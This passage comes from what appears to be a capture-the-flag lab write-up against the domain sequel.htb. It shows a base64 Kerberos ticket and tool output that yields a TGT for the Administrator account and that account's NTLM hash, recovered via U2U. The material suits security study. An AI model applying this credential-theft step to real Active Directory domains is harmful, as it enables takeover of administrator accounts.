      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

  ServiceName              :  krbtgt/sequel.htb
  ServiceRealm             :  SEQUEL.HTB
  UserName                 :  Administrator
  UserRealm                :  SEQUEL.HTB
  StartTime                :  2/26/2023 6:20:08 AM
  EndTime                  :  2/26/2023 4:20:08 PM
  RenewTill                :  3/5/2023 6:20:08 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable
  KeyType                  :  rc4_hmac
  Base64(key)              :  GMvvK34TbmxNnGb/toMqOw==
  ASREP (key)              :  2DD339EE74BA5CC0895DB9EBDE8F9A31

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE

PS C:\Users\Ryan.Cooper\Documents>
```
